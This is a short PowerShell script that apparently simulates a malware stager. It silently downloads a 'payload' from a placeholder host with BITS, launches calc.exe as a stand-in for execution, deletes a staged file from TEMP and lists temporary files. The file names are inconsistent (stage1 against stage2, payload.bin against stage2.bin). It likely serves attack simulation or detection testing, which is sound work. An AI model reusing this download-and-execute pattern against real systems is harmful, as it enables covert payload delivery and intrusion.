
[CmdletBinding()]
param(
    [string]$Stage2Url = 'https://adatum.com/stage1.ps1',
    [string]$Stage2Path = "$env:TEMP\payload.bin",
    [int]$StageTimeout = 125
)
Start-BitsTransfer -Source $Stage2Url -Destination $Stage2Path -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
